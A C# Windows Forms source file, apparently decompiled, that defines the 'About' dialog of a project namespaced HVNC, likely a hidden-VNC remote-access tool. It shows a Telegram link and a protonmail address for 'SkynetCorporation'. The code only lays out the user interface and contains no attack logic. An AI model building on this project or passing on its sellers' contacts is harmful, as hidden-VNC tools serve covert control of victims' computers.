using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;

namespace HVNC
{
	public class FrmAbout : Form
	{
		private IContainer components;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2CirclePictureBox guna2CirclePictureBox2;

		private Guna2CirclePictureBox guna2CirclePictureBox3;

		private Guna2ControlBox guna2ControlBox1;

		private Guna2ControlBox guna2ControlBox2;

		private Guna2DragControl guna2DragControl1;

		private Guna2GroupBox guna2GroupBox2;

		private Guna2ShadowForm guna2ShadowForm1;

		private Label label1;

		private Label label18;

		private Label label3;

		private PictureBox pictureBox1;

		public FrmAbout()
		{
			InitializeComponent();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HVNC.FrmAbout));
			label18 = new System.Windows.Forms.Label();
			guna2ControlBox2 = new Guna.UI2.WinForms.Guna2ControlBox();
			guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
			guna2GroupBox2 = new Guna.UI2.WinForms.Guna2GroupBox();
			guna2CirclePictureBox3 = new Guna.UI2.WinForms.Guna2CirclePictureBox();
			label3 = new System.Windows.Forms.Label();
			guna2CirclePictureBox2 = new Guna.UI2.WinForms.Guna2CirclePictureBox();
			label1 = new System.Windows.Forms.Label();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(components);
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2GroupBox2.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)guna2CirclePictureBox3).BeginInit();
			((System.ComponentModel.ISupportInitialize)guna2CirclePictureBox2).BeginInit();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			SuspendLayout();
			label18.AutoSize = true;
			label18.BackColor = System.Drawing.Color.Transparent;
			label18.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label18.ForeColor = System.Drawing.Color.Gainsboro;
			label18.Location = new System.Drawing.Point(282, 9);
			label18.Name = "label18";
			label18.Size = new System.Drawing.Size(60, 24);
			label18.TabIndex = 2;
			label18.Text = "About";
			guna2ControlBox2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox2.BackColor = System.Drawing.Color.Transparent;
			guna2ControlBox2.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MinimizeBox;
			guna2ControlBox2.FillColor = System.Drawing.Color.Transparent;
			guna2ControlBox2.HoverState.Parent = guna2ControlBox2;
			guna2ControlBox2.IconColor = System.Drawing.Color.White;
			guna2ControlBox2.Location = new System.Drawing.Point(574, 0);
			guna2ControlBox2.Name = "guna2ControlBox2";
			guna2ControlBox2.ShadowDecoration.Parent = guna2ControlBox2;
			guna2ControlBox2.Size = new System.Drawing.Size(33, 34);
			guna2ControlBox2.TabIndex = 0;
			guna2ControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox1.BackColor = System.Drawing.Color.Transparent;
			guna2ControlBox1.FillColor = System.Drawing.Color.Transparent;
			guna2ControlBox1.HoverState.Parent = guna2ControlBox1;
			guna2ControlBox1.IconColor = System.Drawing.Color.White;
			guna2ControlBox1.Location = new System.Drawing.Point(625, 0);
			guna2ControlBox1.Name = "guna2ControlBox1";
			guna2ControlBox1.ShadowDecoration.Parent = guna2ControlBox1;
			guna2ControlBox1.Size = new System.Drawing.Size(33, 34);
			guna2ControlBox1.TabIndex = 0;
			guna2GroupBox2.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2GroupBox2.BorderThickness = 5;
			guna2GroupBox2.Controls.Add(guna2CirclePictureBox3);
			guna2GroupBox2.Controls.Add(label3);
			guna2GroupBox2.Controls.Add(guna2CirclePictureBox2);
			guna2GroupBox2.Controls.Add(label1);
			guna2GroupBox2.Controls.Add(pictureBox1);
			guna2GroupBox2.Controls.Add(guna2ControlBox2);
			guna2GroupBox2.Controls.Add(guna2ControlBox1);
			guna2GroupBox2.Controls.Add(label18);
			guna2GroupBox2.CustomBorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2GroupBox2.Dock = System.Windows.Forms.DockStyle.Top;
			guna2GroupBox2.FillColor = System.Drawing.Color.Transparent;
			guna2GroupBox2.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2GroupBox2.ForeColor = System.Drawing.Color.Gainsboro;
			guna2GroupBox2.Location = new System.Drawing.Point(0, 0);
			guna2GroupBox2.Name = "guna2GroupBox2";
			guna2GroupBox2.ShadowDecoration.Parent = guna2GroupBox2;
			guna2GroupBox2.Size = new System.Drawing.Size(661, 297);
			guna2GroupBox2.TabIndex = 15;
			guna2CirclePictureBox3.BackColor = System.Drawing.Color.Transparent;
			guna2CirclePictureBox3.FillColor = System.Drawing.Color.Transparent;
			guna2CirclePictureBox3.Image = (System.Drawing.Image)resources.GetObject("guna2CirclePictureBox3.Image");
			guna2CirclePictureBox3.ImageRotate = 0f;
			guna2CirclePictureBox3.Location = new System.Drawing.Point(121, 118);
			guna2CirclePictureBox3.Name = "guna2CirclePictureBox3";
			guna2CirclePictureBox3.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
			guna2CirclePictureBox3.ShadowDecoration.Parent = guna2CirclePictureBox3;
			guna2CirclePictureBox3.Size = new System.Drawing.Size(64, 64);
			guna2CirclePictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
			guna2CirclePictureBox3.TabIndex = 146;
			guna2CirclePictureBox3.TabStop = false;
			guna2CirclePictureBox3.UseTransparentBackground = true;
			label3.AutoSize = true;
			label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label3.ForeColor = System.Drawing.Color.Gainsboro;
			label3.Location = new System.Drawing.Point(378, 185);
			label3.Name = "label3";
			label3.Size = new System.Drawing.Size(250, 20);
			label3.TabIndex = 148;
			label3.Text = "https://t.me/skynetcorporationt800";
			guna2CirclePictureBox2.BackColor = System.Drawing.Color.Transparent;
			guna2CirclePictureBox2.FillColor = System.Drawing.Color.Transparent;
			guna2CirclePictureBox2.Image = (System.Drawing.Image)resources.GetObject("guna2CirclePictureBox2.Image");
			guna2CirclePictureBox2.ImageRotate = 0f;
			guna2CirclePictureBox2.Location = new System.Drawing.Point(468, 118);
			guna2CirclePictureBox2.Name = "guna2CirclePictureBox2";
			guna2CirclePictureBox2.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
			guna2CirclePictureBox2.ShadowDecoration.Parent = guna2CirclePictureBox2;
			guna2CirclePictureBox2.Size = new System.Drawing.Size(64, 64);
			guna2CirclePictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
			guna2CirclePictureBox2.TabIndex = 147;
			guna2CirclePictureBox2.TabStop = false;
			label1.AutoSize = true;
			label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label1.ForeColor = System.Drawing.Color.Gainsboro;
			label1.Location = new System.Drawing.Point(33, 185);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(265, 20);
			label1.TabIndex = 149;
			label1.Text = "SkynetCorporation@protonmail.com";
			pictureBox1.BackColor = System.Drawing.Color.Transparent;
			pictureBox1.Location = new System.Drawing.Point(0, -9);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(83, 58);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			pictureBox1.TabIndex = 145;
			pictureBox1.TabStop = false;
			guna2DragControl1.DockIndicatorTransparencyValue = 0.6;
			guna2DragControl1.TargetControl = guna2GroupBox2;
			guna2DragControl1.TransparentWhileDrag = true;
			guna2DragControl1.UseTransparentDrag = true;
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2ShadowForm1.TargetForm = this;
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2BorderlessForm1.TransparentWhileDrag = true;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			base.ClientSize = new System.Drawing.Size(661, 298);
			base.Controls.Add(guna2GroupBox2);
			DoubleBuffered = true;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "FrmAbout";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "FrmAbout";
			guna2GroupBox2.ResumeLayout(false);
			guna2GroupBox2.PerformLayout();
			((System.ComponentModel.ISupportInitialize)guna2CirclePictureBox3).EndInit();
			((System.ComponentModel.ISupportInitialize)guna2CirclePictureBox2).EndInit();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			ResumeLayout(false);
		}
	}
}
